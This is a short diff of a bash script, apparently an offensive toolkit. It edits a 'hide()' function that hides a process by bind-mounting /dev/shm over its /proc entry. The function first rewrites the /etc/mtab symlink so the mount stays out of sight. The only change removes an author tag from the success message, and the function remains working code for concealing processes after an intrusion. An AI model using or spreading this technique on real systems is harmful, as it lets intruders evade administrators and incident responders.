@@ -5,7 +5,7 @@ hide()
 {
 [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
 _pid=${1:-$$}
-[[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[Alh4zr3d] PID $_pid is now hidden"; return; }
+[[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "PID $_pid is now hidden"; return; }
 local _argstr
 for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
 [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
